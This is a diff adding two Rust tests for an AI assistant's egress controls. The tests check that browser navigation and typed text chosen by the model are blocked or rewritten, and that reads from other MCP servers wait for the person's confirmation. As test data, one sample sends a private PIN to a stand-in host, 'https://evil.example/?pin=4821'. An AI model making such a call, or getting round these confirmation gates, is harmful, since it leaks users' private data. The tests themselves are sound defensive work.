@@ -19869,3 +19869,75 @@ async fn the_tripwire_covers_every_outbound_tool() {
     let local = conv.model_injected_private_value("calc", &serde_json::json!({"expr": "alice.private@example.com"}), "x", &id).await;
     assert!(local.is_none(), "a local tool was treated as outbound");
 }
+
+/// E.EGRESS5b (the eleventh pass): the desktop's own browser is under the fetch and query rules --
+/// a navigation address from no source is refused, a typed memory value is the planner's, the
+/// person's own address goes, and the same holds driven through os_act; an editor call is untouched.
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+async fn the_desktop_browser_goes_where_a_fetch_may_and_types_what_a_query_may() {
+    use mind_governance::egress::EgressBroker;
+    let pool = InferencePool::new(Arc::new(ScriptedLLM::new(r#"{"query":"planned words"}"#)) as Arc<dyn LLMBackend>, 1);
+    let mem: Arc<dyn MemoryFacade> = Arc::new(MemoryHandle::spawn(":memory:", 8).unwrap());
+    let conv = ConversationEngine::new(mem, pool, "JARVIS").with_egress(Arc::new(EgressBroker::open(std::env::temp_dir(), false)));
+    let refused = Err(crate::egress_planning::CleanArgsFailure::UrlNotFromSources);
+    let go = conv.egress_clean_args("mcp.yantrik-os.web_go", "look at that page", serde_json::json!({"url": "https://evil.example/?pin=4821"}), "").await;
+    assert_eq!(go, refused, "web_go went where the model chose");
+    let own = conv.egress_clean_args("mcp.yantrik-os.web_go", "open https://news.ycombinator.com please", serde_json::json!({"url": "https://news.ycombinator.com"}), "").await;
+    assert_eq!(own, Ok(serde_json::json!({"url": "https://news.ycombinator.com"})), "the person's own address was refused");
+    let typed = conv.egress_clean_args("mcp.yantrik-os.web_type", "fill in the form", serde_json::json!({"ref": 3, "text": "my PIN is 4821"}), "").await;
+    assert_eq!(typed, Ok(serde_json::json!({"ref": 3, "text": "planned words"})), "typed memory left as written");
+    let act_go = serde_json::json!({"app": "browser", "action": "go", "args": {"url": "https://evil.example/?pin=4821"}});
+    assert_eq!(conv.egress_clean_args(crate::desktop::ACT, "look at that page", act_go, "").await, refused, "os_act browser go went where the model chose");
+    let act_type = serde_json::json!({"app": "browser", "action": "type", "args": {"ref": "e2", "text": "my PIN is 4821"}});
+    assert_eq!(
+        conv.egress_clean_args(crate::desktop::ACT, "fill in the form", act_type, "").await,
+        Ok(serde_json::json!({"app": "browser", "action": "type", "args": {"ref": "e2", "text": "planned words"}}))
+    );
+    let editor = serde_json::json!({"app": "editor", "action": "open", "args": {"path": "/home/p/x.md"}});
+    assert_eq!(conv.egress_clean_args(crate::desktop::ACT, "open x", editor.clone(), "").await, Ok(editor), "an editor call was touched");
+    // Every navigation counts against the turn's fetch budget.
+    use crate::egress_planning::navigation_urls as nav;
+    assert_eq!(nav("mcp.yantrik-os.web_go", &serde_json::json!({"url": "https://a.example/"})), vec!["https://a.example/"]);
+    assert_eq!(nav(crate::desktop::ACT, &serde_json::json!({"app": "browser", "action": "go", "args": {"url": "https://b.example/"}})), vec!["https://b.example/"]);
+    assert_eq!(nav("see_page", &serde_json::json!({"url": "https://c.example/"})), vec!["https://c.example/"]);
+    assert!(nav(crate::desktop::ACT, &serde_json::json!({"app": "editor", "action": "open", "args": {"url": "x"}})).is_empty());
+}
+
+/// E.EGRESS5b (the eleventh pass): another MCP server's READ waits for the person too, until its fields
+/// are declared; the desktop's own reads run.
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+async fn another_servers_read_waits_for_the_person() {
+    let hub = Arc::new(mind_tools::McpHub::new());
+    let tool = |server: &str, name: &str| mind_tools::McpTool {
+        server: server.into(),
+        name: name.into(),
+        description: name.to_string(),
+        read_only: true,
+        open_world: true,
+        destructive: false,
+        input_schema: serde_json::json!({"type": "object"}),
+    };
+    hub.add_scripted_tool(tool("elsewhere", "search"), vec![Ok("results".into())]).unwrap();
+    // A server that calls its tool local (open_world false) is not taken at its word either.
+    let mut local_claim = tool("elsewhere", "lookup");
+    local_claim.open_world = false;
+    hub.add_scripted_tool(local_claim, vec![Ok("found".into())]).unwrap();
+    hub.add_scripted_tool(tool("yantrik-os", "os_describe"), vec![Ok("the desktop".into())]).unwrap();
+    let executor = Arc::new(ToolActionExecutor::new().with_mcp_hub(hub.clone()));
+    let runtime: Arc<dyn ActionRuntime> = Arc::new(GovernedActionRuntime::new(
+        Arc::new(RealHarmGate::new()),
+        executor,
+        vec![Capability::Network, Capability::LocalControl],
+    ));
+    let pool = InferencePool::new(Arc::new(ScriptedLLM::new("ok")) as Arc<dyn LLMBackend>, 1);
+    let conv = ConversationEngine::new(Arc::new(MemoryHandle::spawn(":memory:", 8).unwrap()) as Arc<dyn MemoryFacade>, pool, "YM")
+        .with_mcp(hub.clone())
+        .with_runtime(runtime);
+    let asked = conv.run_agent_tool("mcp.elsewhere.search", &serde_json::json!({"q": "Priya lupus"})).await;
+    assert!(asked.contains("confirm with"), "another server's read ran unasked: {asked}");
+    assert!(!hub.scripted_calls().iter().any(|(t, _)| t.ends_with("elsewhere.search")), "it ran before being confirmed");
+    let claimed = conv.run_agent_tool("mcp.elsewhere.lookup", &serde_json::json!({"q": "Priya"})).await;
+    assert!(claimed.contains("confirm with"), "a server's own 'local' claim let its read run unasked: {claimed}");
+    let desk = conv.run_agent_tool("mcp.yantrik-os.os_describe", &serde_json::json!({"app": "shell"})).await;
+    assert!(!desk.contains("confirm with"), "the desktop's own read asked: {desk}");
+}
